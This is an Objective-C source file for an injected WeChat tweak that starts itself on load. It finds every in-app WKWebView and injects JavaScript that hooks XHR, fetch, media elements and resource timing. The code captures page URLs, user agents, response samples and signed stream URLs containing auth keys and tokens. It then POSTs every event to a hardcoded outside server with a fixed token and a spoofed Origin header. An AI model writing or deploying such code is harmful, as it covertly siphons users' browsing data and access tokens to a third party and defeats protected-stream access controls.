// ALIWeChatWKSniffer_Full.m
// 微信里 WKWebView 页面注入：抓“能看到的都上报”
// 1) 注入成功即弹窗（可关）+ 也会上报一条 INJECT_OK 事件到你的服务器
// 2) 页面侧收集：XHR/fetch/PerformanceObserver(resource)/<video|audio>.src/setAttribute('src')/HLS文本探测
// 3) 原生侧：把所有事件原样 JSON 文本 POST 到 kPushHost；此外若命中像直播的 URL，再额外弹窗+复制

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kFirstDelay     = 2.0;   // 首次启动延迟
static const NSTimeInterval kScanInterval   = 1.5;   // 扫描 WKWebView 的间隔
static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重窗口
static const BOOL kShowPopupOnInject        = YES;   // 注入成功弹窗（提示链路OK）
static const BOOL kShowPopupOnHit           = YES;   // 命中流地址时弹窗 & 复制

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-WX] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 全局

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static BOOL g_started = NO;

#pragma mark - 小工具

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
            if (![s isKindOfClass:[UIWindowScene class]]) continue;
            UIWindowScene *sc = (UIWindowScene*)s;
            if (sc.activationState==UISceneActivationStateForegroundActive){
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}

static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *w = keyWin(); if (!w) return;
            UIViewController *vc = w.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"pull."]||[s containsString:@"replay"]||[s containsString:@"live"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

#pragma mark - 上报（原样 JSON 文本）

static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}

static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

static void handleRawEvent(NSDictionary *evt){
    // 所有页面事件，原样 JSON 发到服务器
    NSString *js = jsonStringify(evt);
    if (js) postText(js);

    // 额外：如果 body 里带 url，且像直播地址，再本地提示/复制/去重
    NSString *u = evt[@"url"];
    if (u && looksLikeStream(u) && !dedupe_skip(u)) {
        if (kShowPopupOnHit){
            UIPasteboard.generalPasteboard.string = u;
            NSString *from = evt[@"from"] ?: evt[@"type"] ?: @"inpage";
            popup(@"抓到URL", [NSString stringWithFormat:@"%@\n%@", from, u], u);
        }
    }
}

#pragma mark - 注入的 JS（激进采集）

static NSString *inpageJS(void){
    // 说明：所有事件通过 __ALI_SNIF__ 发送，结构：{type, url?, method?, status?, ctype?, from, note?, sample? ...}
    // 另外会发送一条 INJECT_OK 事件，包含 location.href / userAgent / time
    return @
    "(function(){try{"
      "if(window.__ALI_SNIF_INJECTED__)return;window.__ALI_SNIF_INJECTED__=true;"
      "function send(t,data){try{var p=data||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
        "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);}else{console.log('[ALI_SNIF]',p);window.__ALI_SNIF_LAST__=p;}}catch(e){}}"
      "function looks(u){if(!u)return false;u=(u+'').toLowerCase();"
        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.ts')!=-1||u.indexOf('.mp4')!=-1) return true;"
        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1) return true;"
        "return false;}"
      "send('INJECT_OK',{});"
      // XHR
      "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;"
        "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
        "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
          "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';"
            "var st=(self.status||0);var sample=null;"
            "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
            "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});"
            "if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
          "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
      "})();"
      // fetch
      "(function(){if(!window.fetch)return;var F=window.fetch;"
        "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
          "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;"
            "var c=r.clone&&r.clone();if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
            "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}"
            "if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
        "catch(e){return F.apply(this,arguments)}})();"
      // PerformanceObserver(resource) —— 大量 URL 会经过这里
      "(function(){if(!('PerformanceObserver'in window))return;"
        "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
        "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
      // <video>/<audio> & setAttribute('src')
      "(function(){function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
        "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
          "if(n&&n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} }"
          "if(n&&n.querySelectorAll){var vs=n.querySelectorAll('video,audio');for(var j=0;j<vs.length;j++){var t2=vs[j].tagName.toLowerCase();report(vs[j],t2,'sub');vs[j].addEventListener&&vs[j].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}});});"
        "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
        "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
        "var setA=Element.prototype.setAttribute;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))send('HIT',{from:'setAttr',url:v});}}}catch(e){}return setA.apply(this,arguments)};"
      "})();"
      "console.log('[ALI_SNIF] injected all');"
    "}catch(e){console.log('[ALI_SNIF] inject error',e);}})();";
}

#pragma mark - JS Bridge（把所有事件原样上报）

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
@end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    @try{
        if (![message.body isKindOfClass:[NSDictionary class]]) return;
        handleRawEvent((NSDictionary *)message.body);
    }@catch(__unused NSException *e){}
}
@end

static ALIMessageHandler *g_handler;

#pragma mark - 注入扫描

static const void *kInjectedKey = &kInjectedKey;

static void inject_into_webview(WKWebView *wv){
    if (!wv) return;
    @try{
        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
        if (flag.boolValue) return; // 已注入
        objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);

        if (!g_handler) g_handler = [ALIMessageHandler new];
        @try{
            [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"];
        }@catch(__unused NSException *e){}

        NSString *js = inpageJS();
        [wv evaluateJavaScript:js completionHandler:^(id r, NSError *err){
            if (err) LOG(@"evaluate JS error: %@", err);
            else     LOG(@"evaluate JS OK");
        }];

        // 注入成功提示（只显示一次）
        static dispatch_once_t onceToken;
        dispatch_once(&onceToken, ^{
            if (kShowPopupOnInject) popup(@"JS 注入成功", @"已开始收集：XHR/fetch/资源列表/Media.src/HLS文本…", nil);
            // 也上报一条原始事件，便于服务器侧确认注入链路
            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000),
                                  @"app": @"WeChat"};
            NSString *s = jsonStringify(evt);
            if (s) postText(s);
        });

    }@catch(__unused NSException *e){}
}

static void walk_view(UIView *v){
    if (!v) return;
    @try{
        Class WK = NSClassFromString(@"WKWebView");
        if (WK && [v isKindOfClass:WK]) inject_into_webview((WKWebView *)v);
        for (UIView *sub in v.subviews) walk_view(sub);
    }@catch(__unused NSException *e){}
}

static void scan_loop(void){
    on_main(^{
        @try{
            for (UIWindow *w in UIApplication.sharedApplication.windows){
                walk_view(w);
            }
        }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

#pragma mark - 入口

__attribute__((constructor))
static void ALIWeChatWKSnifferInit(void){
    @try{
        if (g_started) return;
        g_started = YES;
        if (!gq)    gq    = dispatch_queue_create("com.aliwechat.wksniffer.full", DISPATCH_QUEUE_SERIAL);
        if (!g_seen)g_seen= [NSMutableDictionary dictionary];

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kFirstDelay*NSEC_PER_SEC)),
                       gq, ^{
            LOG(@"start scanning WKWebView…");
            scan_loop();
        });
    }@catch(__unused NSException *e){}
}
